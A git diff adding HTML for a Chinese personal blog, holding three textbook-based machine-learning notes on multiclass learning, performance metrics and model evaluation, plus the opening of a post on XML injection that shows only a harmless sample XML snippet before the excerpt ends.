@@ -258,6 +258,879 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/26/机器学习-7-——多分类学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/07/26/机器学习-7-——多分类学习/" itemprop="url">
+                  机器学习(7)——多分类学习
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-26T14:59:28+08:00">
+                2018-07-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/机器学习/" itemprop="url" rel="index">
+                    <span itemprop="name">机器学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/07/26/机器学习-7-——多分类学习/" class="leancloud_visitors" data-flag-title="机器学习(7)——多分类学习">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前在逻辑回归中也提到了多分类问题，但是仅仅介绍了其中一种情况。多分类还存在一些其他的方式与问题，在这里总结一遍，用作笔记。</p>
+<p>除过那些直接可以由二分类算法推广到多分类的情况，我们就是基于一些策略利用二分类学习器来解决多分类问题。</p>
+<h2 id="0x01-一对一-One-vs-One"><a href="#0x01-一对一-One-vs-One" class="headerlink" title="0x01 一对一(One vs. One)"></a>0x01 一对一(One vs. One)</h2><p>OvO策略是将N个类别，两两配对分类，一共就产生了N(N-1)/2个二分类任务。在测试阶段，我们将新样本提交给所有的分类器，一共得到N(N-1)/2个分类结果，而最终这个新样本属于哪一类，可以通过投票产生，即这N(N-1)/2个分类结果中，预测得到最多得那个分类作为最终分类结果。</p>
+<h2 id="0x02-一对其余-One-vs-Rest"><a href="#0x02-一对其余-One-vs-Rest" class="headerlink" title="0x02 一对其余(One vs. Rest)"></a>0x02 一对其余(One vs. Rest)</h2><p>OvR策略是将N个类别，每次分别取一类作一次正例，其余类都作为反例，一共训练N个分类器。在测试阶段，我们将新样本提交给所有分类器，一共产生N个分类结果，这N个结果中置信度最高的一个就是最终结果。</p>
+<h2 id="0x03-多对多-Many-vs-Many"><a href="#0x03-多对多-Many-vs-Many" class="headerlink" title="0x03 多对多(Many vs. Many)"></a>0x03 多对多(Many vs. Many)</h2><p>MvM策略是每次将一部分类作为正类，一部分其他类作为反类。MvM的正反类构造不能随意选取，必须有特殊的设计。</p>
+<p>最常用的MvM技术是“纠错输出码”(Error Correcting Output Codes)</p>
+<p>纠错输出码是将编码的思想引入类别拆分，并尽可能在解码的过程中具有容错性。纠错输出码的工作过程：</p>
+<ul>
+<li>（1）编码：对N个类别做M次划分，每次划分将一部分类别划为正类，一部分划为反类，从而形成一个二分类训练集。这样一共产生M个训练集，可以训练出M个分类器。</li>
+<li>（2）解码：M个分类器分别对测试样本进行预测，这些预测标记组成一个编码，将这个预测编码与每个类别各自的编码进行比较，返回其中距离最小的类别作为最终预测结果。</li>
+</ul>
+<p>类别划分时使用编码矩阵表示，目前主要的编码矩阵是二元码和三元码：</p>
+<ul>
+<li>二元码： 每个类别有正类、反类两种情况。</li>
+<li>三元码： 每个类别有正类、反类、停用类三种情况。</li>
+</ul>
+<p>如图所示：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml7_01.png?raw=true" alt=""></p>
+<p>以二元码为例，图中使用五个分类器进行MvM分类，然后根据对不同类别的正反分类构成了黑白相间的编码矩阵。</p>
+<p>在解码时，我们将样例输入到五个分类器中，得到一个长度为5的测试样例，然后跟矩阵中c1、c2、c3、c4四个类别的编码方式比较，计算其欧氏距离，距离最小的类别c3就是最终预测结果，也就是说此样例被分类到c3。</p>
+<p>如果MvM用到的分类器越多，横轴也会越长，编码长度也就越长，这样即使有个别分类器预测错误，也不会影响最终结果。也就是说，分类器越多纠错能力越强。不过分类器越多，我们需要训练的次数也就越多，计算量就会增大，所以应当根据实际情况选择合适的分类器数量。</p>
+<h2 id="0x04-类别不平衡问题"><a href="#0x04-类别不平衡问题" class="headerlink" title="0x04 类别不平衡问题"></a>0x04 类别不平衡问题</h2><p>在通常的分类任务中，我们默认几类几类情况的发生几率差距不是特别大，但是如果某一类情况发生几率十分大，比如99.9%，另一类发生几率特别小，比如0.1%。</p>
+<p>这种情况下，我们的样本正例太多，反例太少，学习器往往会出现一些误差。</p>
+<p>此时我们需要用m+表示正例数目，m-表示反例数目，观测几率就是m+/m-，这个时候我们只需要分类器预测几率高于观测几率就应判定为正例，即</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml7_02.png?raw=true" alt=""></p>
+<p>但是我们的分类器是根据y/(1-y)进行决策的，为了适应它，我们只需要“再缩放”一下：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml7_03.png?raw=true" alt=""></p>
+<h2 id="0x05-参考文档"><a href="#0x05-参考文档" class="headerlink" title="0x05 参考文档"></a>0x05 参考文档</h2><p>《机器学习》——周志华</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/25/机器学习-6-——性能度量/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/07/25/机器学习-6-——性能度量/" itemprop="url">
+                  机器学习(6)——性能度量
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-25T14:40:28+08:00">
+                2018-07-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/机器学习/" itemprop="url" rel="index">
+                    <span itemprop="name">机器学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/07/25/机器学习-6-——性能度量/" class="leancloud_visitors" data-flag-title="机器学习(6)——性能度量">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-性能度量"><a href="#0x00-性能度量" class="headerlink" title="0x00 性能度量"></a>0x00 性能度量</h2><p>对学习器泛化性能进行评估时，不仅需要有效可行的实验估计方法，还需要有衡量模型泛化能力的评价标准，这就是性能度量。</p>
+<p>性能度量反映任务需求，在对比不同模型的能力时，使用不同的性能度量往往会导致不同的评判结果，也就是说，模型的好坏是相对的，需要根据实际情况进行选择。</p>
+<h2 id="0x01-回归任务中的性能度量"><a href="#0x01-回归任务中的性能度量" class="headerlink" title="0x01 回归任务中的性能度量"></a>0x01 回归任务中的性能度量</h2><p>回归任务中最常用的性能度量是“均方误差”(mean squared error)</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_01.png?raw=true" alt=""></p>
+<p>对于一般的数据分布D和概率密度函数p，均方误差可以表示为：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_02.png?raw=true" alt=""></p>
+<h2 id="0x02-分类任务中的性能度量"><a href="#0x02-分类任务中的性能度量" class="headerlink" title="0x02 分类任务中的性能度量"></a>0x02 分类任务中的性能度量</h2><h3 id="错误率与精度"><a href="#错误率与精度" class="headerlink" title="错误率与精度"></a>错误率与精度</h3><p>分类任务中最常用的两种性能度量就是错误率和精度，同时适用于二分类和多分类任务。</p>
+<p>错误率是分类错误的样本数占样本总数的比例。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_01.png?raw=true" alt=""></p>
+<p>精度是分类正确的样本数占样本总数的比例。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_04.png?raw=true" alt=""></p>
+<p>对于一般的数据分布D和概率密度函数p，错误率和精度可以表示为：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_05.png?raw=true" alt=""></p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_06.png?raw=true" alt=""></p>
+<h3 id="查准率、查全率与F1"><a href="#查准率、查全率与F1" class="headerlink" title="查准率、查全率与F1"></a>查准率、查全率与F1</h3><p>错误率和精度只能表示一部分的性能，如果我们要深入的研究这个问题，就需要用到别的性能度量。</p>
+<p>查准率P是我们检索到的样本中有多少比例是正确的。</p>
+<p>查全率R是正确的样本中有多少被检索到了。</p>
+<table>
+<thead>
+<tr>
+<th>真实情况\预测结果</th>
+<th>正例</th>
+<th>反例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>正例</td>
+<td>TP(真正例)</td>
+<td>FN(假反例)</td>
+</tr>
+<tr>
+<td>反例</td>
+<td>FP(假正例)</td>
+<td>TN(真反例)</td>
+</tr>
+</tbody>
+</table>
+<p>从定义我们就可以得出，差准率和查拳率是一堆矛盾的变量。一般情况下，查准率高时查全率就会低；查全率高时查准率就会低。</p>
+<p>如果我们我们根据学习器的预测结果对样例排序，最可能正确的排在最前，最可能错误的排在最后。按照这个顺序逐个把样本作为正确的进行预测，则每次可以计算出当前查全率、查准率。</p>
+<p>然后以查准率为纵轴，查全率为横轴作图，就得到了查准率-查全率曲线，也称为“P-R”曲线。</p>
+<p>如图：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_07.png?raw=true" alt=""></p>
+<p>P-R图可以直观的表示学习器在总样本上的查全率和查准率，如果一个学习器的P-R曲线被另一个学习器的P-R曲线完全包住，则可以断言后者的性能优于前者。如果P-R曲线交叉，则需要根据实际的需求来进行比较。如果一定要把学习器的性能分个高低，一个比较合理的判据是比较P-R曲线下面积的大小，它在一定程度上表征了学习器在查准率和查全率上取得相对“双高”的比例。</p>
+<p>这个面积值不容易估算，所以又设计了一些综合考虑查准率和查全率的性能度量。平衡点（Break-Event Point）就是这样一个度量，它是“查准率=查全率”时的取值，可以通过比较BEP值来比较学习器的性能。</p>
+<p>但是BEP过于简化，我们更常用的的是F1度量：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_08.png?raw=true" alt=""></p>
+<p>其中TP是假设正确并且实际正确的样例数，TN是假设错误并且实际错误的样例数。</p>
+<p>在实际的应用中，我们要根据不同需求改变对查准率和查全率的重视程度。如商品推荐中应该尽可能推荐用户最感兴趣的，查准率更重要；在逃犯信息检索中，需要尽可能不漏掉逃犯，所以查全率更重要。所以就引出了F1度量的一般形势Fβ，能表达出对查准率和查全率的不同偏好。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_09.png?raw=true" alt=""></p>
+<p>其中β代表查全率与查准率的相对重要性，在β=1时，就是F1；在β&gt;1时，查全率更重要；在β&lt;1时，查准率更重要。</p>
+<h3 id="ROC与AUC"><a href="#ROC与AUC" class="headerlink" title="ROC与AUC"></a>ROC与AUC</h3><p>在分类时，我们会选择一个阈值判别，我们将学习器的预测结果对样例排序，最可能正确的排在最前，最可能错误的排在最后。然后我们可以通过一个截断点来把样本分成两部分。在不同的任务中，我们可以根据实际的需求选择不同位置的截断点，如果我们更重视“查准率”，则可以选择排序中靠前的位置进行截断；若更重视“查全率”，则可选择靠后的位置进行截断。</p>
+<p>ROC全称是“受试者工作特征”曲线，我们根据学习器的预测结果对样例进行排序，按此顺序逐个把样本作为正例进行预测，每次计算出两个重要量的值，分别以它们为横纵坐标做图，就得到了ROC曲线。与P-R曲线使用查准率、查全率为横、纵轴不同，ROC曲线纵轴是“真正例率”（TPR），横轴是“假正例率”（FPR）。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_10.png?raw=true" alt=""></p>
+<p>进行学习器比较时，若一个学习器的ROC曲线被另一个学习器的ROC曲线完全包裹，那么可以断言后者性能优于前者，若两个学习器发生交叉，则比较ROC曲线下的面积，即AUC(Area Under ROC Curve)</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_11.png?raw=true" alt=""></p>
+<h3 id="代价敏感错误率与代价曲线"><a href="#代价敏感错误率与代价曲线" class="headerlink" title="代价敏感错误率与代价曲线"></a>代价敏感错误率与代价曲线</h3><p>在现实情况中，分类错误之后不同类型错误所造成的后果也不同，比如安检通道把钥匙等金属制品错误的分类到危险品，仅仅是多了一层人工检查的麻烦；但是如果把一把刀错误的分类到安全品里面，那么可能造成十分严重的后果。不同的错误造成的损失是不同的，为了权衡这个损失，可以为错误赋予“非均等代价”(unequal cost)。</p>
+<p>我们可以用一张表来代表代价：</p>
+<table>
+<thead>
+<tr>
+<th>真实类别\预测类别</th>
+<th>第0类</th>
+<th>第1类</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>第0类</td>
+<td>0</td>
+<td>cost01</td>
+</tr>
+<tr>
+<td>第1类</td>
+<td>cost10</td>
+<td>0</td>
+</tr>
+</tbody>
+</table>
+<p>如果是多分类问题，costij代表第i类的错误被归到第j类所引起的代价。</p>
+<p>我们前面的几种方法都是以最小化错误次数为目标的，也就是认为所有错误的代价是均等的。</p>
+<p>在非均等代价下，就需要代价曲线来表示学习器的总体代价。代价曲线图的横轴取值为[0,1]的正例概率代价：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_12.png?raw=true" alt=""></p>
+<p>代价曲线的绘制则是ROC上每一点对应了代价平面上的一条线段，设ROC曲线上点的坐标是(TPR,FPR)，则可以计算出FNR，然后在代价平面上绘制一条从(0,FPR)到(1,FNR)的线段，线段下的面积即表示了该条件下的期望总体代价。</p>
+<p>然后将ROC曲线上的每个点都这样转换成一条线段，再取所有线段的下界，围成的面积即为在所有条件下学习器的期望总体代价。如图：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_13.png?raw=true" alt=""></p>
+<h2 id="0x03-参考文档"><a href="#0x03-参考文档" class="headerlink" title="0x03 参考文档"></a>0x03 参考文档</h2><p>《机器学习》——周志华</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/24/机器学习-5-——模型评估方法/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/07/24/机器学习-5-——模型评估方法/" itemprop="url">
+                  机器学习(5)——模型评估方法
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-24T20:42:30+08:00">
+                2018-07-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/机器学习/" itemprop="url" rel="index">
+                    <span itemprop="name">机器学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/07/24/机器学习-5-——模型评估方法/" class="leancloud_visitors" data-flag-title="机器学习(5)——模型评估方法">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-模型评估与选择"><a href="#0x00-模型评估与选择" class="headerlink" title="0x00 模型评估与选择"></a>0x00 模型评估与选择</h2><p>在机器学习中，我们需要对使用的模型进行评估，对误差等进行分析，来选择一个预测准确率最高的模型。</p>
+<h2 id="0x01-误差"><a href="#0x01-误差" class="headerlink" title="0x01 误差"></a>0x01 误差</h2><p>我们把学习器的实际预测输出与样本的真实输出之间的差异称为误差。</p>
+<ul>
+<li><p>经验误差：学习器在训练集上的误差称为训练误差或经验误差。</p>
+</li>
+<li><p>泛化误差：将训练好的模型用在新样本上的误差称为泛化误差。</p>
+</li>
+</ul>
+<p>机器学习的目的是为了预测新样本的情况，所以我们需要在新样本上表现很好的学习器，即需要得到一个泛化误差小的学习器。</p>
+<h2 id="0x02-过拟合与欠拟合"><a href="#0x02-过拟合与欠拟合" class="headerlink" title="0x02 过拟合与欠拟合"></a>0x02 过拟合与欠拟合</h2><ul>
+<li><p>过拟合：学习器把训练样本自身的一些特点当作了所有潜在样本都会具有的一般性质，导致泛化性能下降。一般是由于学习能力过强，将训练样本所包含的不太一般的性质都学到了。</p>
+</li>
+<li><p>欠拟合：学习器学习能力过弱，对训练样本的一般性质尚未学好</p>
+</li>
+</ul>
+<p>欠拟合比较容易克服，可以在决策树学习中扩展分支、在神经网络中增加训练轮数等。</p>
+<p>过拟合则难克服，过拟合是机器学习面临的关键障碍，各类学习算法都有一些针对过拟合的措施来缓解过拟合。</p>
+<h2 id="0x03-评估方法"><a href="#0x03-评估方法" class="headerlink" title="0x03 评估方法"></a>0x03 评估方法</h2><p>为了对学习器的泛化误差进行评估，需要使用一个测试集来测试学习器对新样本的判别能力，然后以测试集上的测试误差作为泛化误差的近似。</p>
+<p>测试集应该尽量与训练集互斥，即测试样本尽量不在训练集中出现、未在训练集中使用过。</p>
+<p>下来介绍几种常用的评估方法：</p>
+<h3 id="留出法"><a href="#留出法" class="headerlink" title="留出法"></a>留出法</h3><p>留出法是直接将数据集D划分为两个互斥的几何，其中一个集合作为训练集S，另一个作为测试集T。</p>
+<p>在训练集S中训练出模型后，用测试集T来评估其测试误差，作为对泛化误差的估计。</p>
+<p>训练/测试集要尽可能的保证数据分布的一致性，避免因数据划分过程引入额外的偏差而对最终结果产生影响。具体做法是尽可能保留类别比例，最好使用分层采样的方法。</p>
+<h3 id="交叉验证法"><a href="#交叉验证法" class="headerlink" title="交叉验证法"></a>交叉验证法</h3><p>交叉验证法先将数据集D划分为k个大小相似的互斥子集，每个子集尽可能的保证数据分布的一致性。<br>然后每次使用k-1个子集作为训练集，余下的一个子集作为测试集。<br>这样就可以得到k组训练/测试集，可以进行k次训练和测试，最终返回的是k个测试结果的均值。</p>
+<p>交叉验证法评估结果的稳定性和保真性在很大程度上取决于k的取值。<br>通常将交叉验证法称为“k折交叉验证”。如k取10，则称为10折交叉验证。</p>
+<h3 id="留一法"><a href="#留一法" class="headerlink" title="留一法"></a>留一法</h3><p>如果数据集D中包含m个样本，若令k=m，则得到了交叉验证法的一个特例：留一法。</p>
+<p>显然，留一法不受随机样本划分方式的影响，因为留一法只有唯一一种划分方式。</p>
+<p>留一法的评估结果往往被认为比较准确。但是留一法也存在缺陷，当数据集较大时，训练m个模型的计算开销非常大。比如我们是上千万级的数据，那么就得训练上千万个模型，这是不现实的。</p>
+<h3 id="自助法"><a href="#自助法" class="headerlink" title="自助法"></a>自助法</h3><p>上述几种方法都存在一个问题，那就是由于保留了一部分样本用于测试，导致实际评估的模型所使用的训练集比D小，会引起一些误差，而自助法，可以解决这个问题。</p>
+<p>自助法以自助采样法为基础，给定包含m个样本的数据集D，对它进行采样产生数据集D’：<br>每次随机从D中挑选一个样本，再将样本放回初始数据集中，使得该样本在下次采样时仍有可能被采到。这个过程重复执行m次后，我们就得到了包含m个样本的数据集D’，这就是自助采样的结果。</p>
+<p>D中有一部分样本会在D’中多次出现，而另一部分样本不出现。可以做一个简单的估计，样本在m次采样中始终不被采到的概率是<br><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml5_01.png?raw=true" alt=""></p>
+<p>取极限得到<br><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml5_02.png?raw=true" alt=""></p>
+<p>即通过自助采样，初始数据集中约有36.8%的样本未出现在采样数据集D’中，于是我们可以将D’用作训练集，D-D’用作测试集，这样世纪评估的模型与期望评估的模型都使用了m个训练样本，而我们仍然有数据总量36.8%、未在训练集中出现的样本用于测试。这样的测试结果，也被称为“包外估计”。</p>
+<p>自助法在数据集较小、难以有效划分训练/测试集时很有用；此外，自助法能从初始数据集中产生多个不同的训练集，这对集成学习等方法有很大的好处。</p>
+<p>自助法的缺陷是：自助法产生的数据集改变了初始数据集的分布，这会引入估计误差。</p>
+<p>所以在初始数据集够用的情况下，留出法和交叉验证法更常用。</p>
+<h2 id="0x04-调参与最终模型"><a href="#0x04-调参与最终模型" class="headerlink" title="0x04 调参与最终模型"></a>0x04 调参与最终模型</h2><p>大多数学习算法都有参数需要设定，参数配置不同，学得模型的性能往往有显著差别。因此，在进行模型评估与选择时，除了要对适用学习算法进行选择，还需要对算法参数进行设定，这就是通常所说的“参数调节”。</p>
+<p>给定包含m个样本的数据集D，在模型评估与选择过程中由于需要留出一部分数据进行评估测试，事实上我们只使用了一部分数据训练模型。因此，在模型选择完成后，学习算法和参数配置已选定，我们要用数据集D重新训练模型，使用所有的m个样本。这时产生的模型才是最终模型。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/23/xml注入攻击总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/07/23/xml注入攻击总结/" itemprop="url">
+                  xml注入攻击总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-23T18:50:05+08:00">
+                2018-07-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/07/23/xml注入攻击总结/" class="leancloud_visitors" data-flag-title="xml注入攻击总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前的博客中，详细的讲了xxe(外部实体注入攻击)，那是一种典型的xml注入攻击，但是xml注入利用的手法还有很多，下来详细的介绍一下xml的其他利用手法。</p>
+<h2 id="0x01-xml数据注入"><a href="#0x01-xml数据注入" class="headerlink" title="0x01 xml数据注入"></a>0x01 xml数据注入</h2><p>xml数据注入，就是通过一些方式，将本来无法更改的xml中的数据更改。</p>
+<p>我们假设一种情况，比如一个购物网站的某处xml代码如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">phone</span>&gt;</span>13200000000<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">price</span>&gt;</span>200<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>shanghai<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>假如这里phone中是电话号码，price中是价格，address中是地址。购物网站中，电话号码和地址是用户可控的，价格是用户不可控的。</p>
